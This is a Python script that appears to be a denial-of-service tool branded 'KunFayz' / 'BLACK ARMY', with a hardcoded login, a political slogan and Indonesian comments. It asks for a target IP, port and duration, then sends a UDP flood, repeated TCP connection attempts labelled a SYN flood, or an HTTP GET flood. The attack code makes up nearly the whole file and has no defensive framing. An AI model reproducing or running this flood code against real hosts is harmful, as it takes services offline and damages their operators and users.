#!usr/bin/python3.12
# _*_ coding: utf-8 _*_
import os
import socket
import sys
import time
import requests
import threading
import string
import random
from colorama import Fore, Style, init
import logging                                                                                                                             

# Inisialisasi colorama
init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")
attemps = 0    
os.system("clear")
print("""
\033[31m╔══════════════════════════════════════════════════════════════════════╗
\033[31m║\033[100m                                                                      \033[31m║
\033[31m║\033[100m         \033[31m██████╗\033[33m  █╗\033[32m        ███╗\033[97m   ██████╗\033[34m █╗   █╗                    \033[31m║
\033[31m║\033[100m         \033[31m█╔════█╗\033[33m █║\033[32m       █╔══█╚╗\033[97m █╔════╝\033[34m █║  █║                     \033[31m║
\033[31m║\033[100m         \033[31m█║    █║\033[33m █║\033[32m      █║    █║\033[97m █║\033[34m      █║ █║                      \033[31m║
\033[31m║\033[100m         \033[31m██████═╝\033[33m █║\033[32m      █║    █║\033[97m █║\033[34m      ███╝                       \033[31m║   
\033[31m║\033[100m         \033[31m█╔════█╗\033[33m █║\033[32m      █║    █║\033[97m █║\033[34m      █╔═█╗                      \033[31m║
\033[31m║\033[100m         \033[31m█║    █║\033[33m █║\033[32m      ███████║\033[97m █║\033[34m      █║  █║                     \033[31m║
\033[31m║\033[100m         \033[31m██████╔╝\033[33m ██████╗\033[32m █╔════█║\033[97m ██████║\033[34m █║   █║                    \033[31m║
\033[31m║\033[100m         \033[31m╚═════╝\033[33m  ╚═════╝\033[32m ╚╝    ╚╝\033[97m ╚═════╝\033[34m ╚╝   ╚╝                    \033[31m║
\033[31m║\033[100m                             \033[38;5;206m  ███╗\033[38;5;39m   ██████╗\033[38;5;141m   ██╗╔██╗\033[38;5;154m  █╗      █╗   \033[31m║
\033[31m║\033[100m                             \033[38;5;206m █╔══█╚╗\033[38;5;39m █╔════█╗\033[38;5;141m █╔═█╔══█║\033[38;5;154m  █║    █║    \033[31m║
\033[31m║\033[100m                             \033[38;5;206m█║    █║\033[38;5;39m █║    █║\033[38;5;141m █║ █║  █║\033[38;5;154m   █║  █║     \033[31m║
\033[31m║\033[100m                             \033[38;5;206m█║    █║\033[38;5;39m █║    █║\033[38;5;141m █║ █║  █║\033[38;5;154m    ███╝      \033[31m║
\033[31m║\033[100m                             \033[38;5;206m███████║\033[38;5;39m ██████║\033[38;5;141m  █║ ╚╝  █║\033[38;5;154m     █║       \033[31m║
\033[31m║\033[100m                             \033[38;5;206m█║    █║\033[38;5;39m █╔════█║\033[38;5;141m █║     █║\033[38;5;154m     █║       \033[31m║
\033[31m║\033[100m                             \033[38;5;206m╚╝    ╚╝\033[38;5;39m ╚╝    ╚╝\033[38;5;141m ╚╝     ╚╝\033[38;5;154m     ╚╝       \033[31m║
\033[31m╚══════════════════════════════════════════════════════════════════════╝
""")
# Versi dan IP
print(f"\033[97m╔{'═' * 70}╗")
print(f"\033[97m║ \033[104m{' ' * 4}v.1.0{' ' * 59}\033[0m ║")
print(f"\033[97m║ \033[104m{' ' * 4}https://www.https//kunkaffa@gmail.com{' ' * 27}\033[0m ║")
print(f"\033[97m╚{'═' * 70}╝")
while attemps < 100:
    print("\033[32m┏━━KunFayz━━⬣")
    username = input("\033[103m\033[32m┗> Enter your username: \033[0m")
    print("\033[32m┏━━KunFayz━━⬣")
    password = input("\033[103m\033[33m┗> Enter your password: \033[0m")

    if username == 'kf99' and password == 'kf99':
        print("\033[100m \033[32m••> ZONA FIGHT ZI0NIST \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

# Meminta IP target
print("\033[32m┏━━KunFayz━━⬣")
ip = input("Enter the target IP: ")
try:
    port = int(input("Enter the target port: "))
except ValueError:
    print("Invalid port. Exiting...")
    sys.exit()

# Durasi waktu serangan (second)
try:
    duration = int(input("Enter the duration of the attack in seconds: "))
except ValueError:
    print("Durasi tidak valid. Keluar..")
    sys.exit()

# Fungsi untuk melakukan serangan Banjir UDP


def udp_flood(ip, port, message, duration):
    # Create the UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Tetapkan batas waktu untuk soket agar program tidak macet
    s.settimeout(duration)

    # Alamat IP dan nomor port dari host target
    target = (ip, port)

    # Mulai mengirim paket
    start_time = time.time()
    packet_count = 0
    while True:
        # Send the message to the target host
        try:
            s.sendto(message, target)
            packet_count += 1
            print(f"Sent packet {packet_count}")
        except socket.error:
            # Jika soket tidak dapat mengirim paket, hentikan loop
            break

        # Jika durasi yang ditentukan telah lewat, hentikan loop
        if time.time() - start_time >= duration:
            break

    # Close the socket
    s.close()

# Fungsi untuk melakukan serangan SYN Flood
def syn_flood(ip, port, duration):
    sent = 0
    timeout = time.time() + int(duration)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sent += 1
            print(f"SYN Packets sent: {sent} to target: {ip}")
            sock.close()
        except OSError:
            pass
        except KeyboardInterrupt:
            print("\n[*] Attack stopped.")
            sys.exit()
        finally:
            sock.close()  # Pastikan untuk menutup soket dalam semua kasus
# Fungsi untuk melakukan serangan HTTP Flood

def http_flood(ip, port, duration):
    # create a socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # create HTTP request
    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"

    sent = 0
    timeout = time.time() + int(duration)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            # Re-create the socket for each iteration
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall(http_request)
            sent += 1
            print(f"\033[31m[]  \0337m\033[97mBLACK ARMY\033[0m  \033[100m\033[31mHTTP Packets sent\033[0m  \033[32m{sent} to target  \033[103m\033[97m{ip}\033[0m")
            print(f"\033[33m[]  \033[32mBLACK ARMY  \033[32mHTTP Packets sent \033[0m  \033[33m{sent} to target  \033[38;5;206m{ip}\033[0m")
        except KeyboardInterrupt:
            print("\n[-] Attack stopped by user")
            break
    sock.close()


# Prompt for the type of attack
attack_type = input((
    "Enter the type of attack (Choose Number) (1.UDP/2.HTTP/3.SYN): ", "green"))

if attack_type == "1":
    message = b"Sending 1337 packets "
    print(("UDP attack selected", "red"))
    udp_flood(ip, port, message, duration)
    print(("UDP attack completed", "red"))
elif attack_type == "3":
    print(("SYN attack selected", "red"))
    syn_flood(ip, port, duration)
elif attack_type == "2":
    print(("HTTP attack selected", "red"))
    http_flood(ip, port, duration)
else:
    print(("Invalid attack type. Exiting...", "green"))
    sys.exit()
